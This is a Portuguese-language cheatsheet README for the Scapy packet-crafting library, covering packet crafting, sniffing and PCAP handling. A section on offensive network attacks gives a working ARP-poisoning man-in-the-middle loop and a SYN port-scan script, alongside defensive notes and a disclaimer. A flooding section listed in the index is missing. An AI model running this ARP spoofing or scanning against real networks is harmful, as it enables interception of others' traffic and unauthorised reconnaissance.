<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="Ataques de rede">
</p>

<p alinhar="centro">
  <b>🐍 A mais recente ferramenta e biblioteca interativa de manipulação de pacotes baseada em Python, capaz de forjar, enviar, detectar, dissecar e difundir pacotes de rede arbitrários</b>
</p>

---

## 📋 Índice

- [Visão geral e modelo de camada de empilhamento (`/`)](#-overview--the-stacking-layer-model-)
- [Instalação](#-instalação)
- [Iniciando o Shell Interativo](#-iniciando-o-shell interativo)
- [Elaboração de pacotes de rede](#-crafting-network-packets)
  - [Handshakes IP e TCP](#ip-and-tcp-handshakes)
  - [ICMP Ping e Traceroute](#icmp-ping--traceroute)
  - [Consultas e resolução de DNS](#dns-queries--resolution)
- [Envio e recebimento de pacotes](#-envio--recebimento de pacotes)
  - [Camada 3: `send()`, `sr()`, `sr1()`](#camada-3-send-sr-sr1)
  - [Camada 2: `sendp()`, `srp()`, `srp1()`](#camada-2-sendp-srp-srp1)
- [Detecção de pacotes e manipulação de PCAP](#-detecção de pacotes - manipulação de pcap)
  - [Capturando pacotes ao vivo (`sniff()`)](#capturing-live-packets-sniff)
  - [Ler e gravar arquivos PCAP](#reading--writing-pcap-files)
- [Ataques ofensivos à rede](#-ataques ofensivos à rede)
  - [Envenenamento de cache ARP (MITM)](#arp-cache-poisoning-mitm)
  - [Script de verificação de porta SYN](#syn-port-scanning-script)
  - [Inundação TCP SYN/ICMP](#tcp-syn--icmp-flooding)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e detecção](#-considerações defensivas--detecção)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e modelo de camada de empilhamento (`/`)

Criado por **Philippe Biondi**, o **Scapy** substitui dezenas de ferramentas de rede de propósito único (ping, traceroute, arpspoof, nmap stubs).

A genialidade do Scapy está em usar o operador de divisão do Python (`/`) para empilhar camadas de protocolo:
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
Cada campo de camada possui valores padrão sensatos que o Scapy calcula automaticamente (somas de verificação, comprimentos, endereços MAC, IP de origem).

---

## 📥 Instalação
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 Iniciando o Shell Interativo

Inicie o shell REPL interativo (requer privilégios de root para forjar soquetes brutos):
```bash
sudo scapy
```
Inspecione os protocolos e funções disponíveis dentro do Scapy:
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ Criação de pacotes de rede

### Apertos de mão IP e TCP
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### ICMP Ping e rastreamento de rota
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### Consultas e resolução de DNS
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 Envio e recebimento de pacotes

Scapy separa a transmissão por camada OSI:

### Camada 3: `send()`, `sr()`, `sr1()`
Opera com cabeçalhos Ethernet atribuídos ao kernel (começa na camada IP):
- `send(pkt)`: Transmite pacote na Camada 3; não espera por uma resposta.
- `sr(pkt)`: Envia pacotes e retorna pares atendidos e não respondidos `(ans, unans)`.
- `sr1(pkt)`: Envia pacote e retorna apenas o primeiro pacote de resposta.

### Camada 2: `sendp()`, `srp()`, `srp1()`
Enquadramento personalizado de Ethernet/link de dados (começa em `Ether()`):
- `sendp(Ether() / IP(...), iface="eth0")`: Envia quadro Ethernet bruto.
- `srp(Ether() / ARP(...))`: Envie solicitação ARP e receba resposta.

---

## 🔍 Detecção de pacotes e manuseio de PCAP

### Capturando pacotes ao vivo (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### Lendo e gravando arquivos PCAP
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ Ataques ofensivos à rede

### Envenenamento de cache ARP (MITM)
Falsificar tabelas ARP para interceptar o tráfego entre a vítima e o gateway:
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### Script de verificação de porta SYN
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando Scapy |
|-----------|---------------|
| **Iniciar Shell Interativo** | `sudo scapy` |
| **Inspecionar campos de protocolo** | `ls(IP)` ou `ls(TCP)` |
| **Enviar pacote L3** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Enviar e receber 1ª resposta**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **Enviar quadro Ethernet L2** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Farejar com filtro BPF** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **Salvar no PCAP** | `wrpcap("out.pcap", pkts)` |
| **Leia do PCAP** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ Considerações defensivas e detecção

1. **Inspeção dinâmica de ARP (DAI):** Configure switches corporativos com DAI e DHCP Snooping para descartar respostas ARP gratuitas forjadas.
2. **Regras IDS/Suricata:** Varreduras SYN rápidas semiabertas e combinações de sinalizadores TCP malformadas (Xmas, NULL) geradas por alertas IDS padrão do Scapy acionam.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> O Scapy pode gerar pacotes malformados que causam condições de negação de serviço ou interceptam dados privados. Deve ser utilizado estritamente em avaliações de segurança autorizadas e redes de testes isoladas.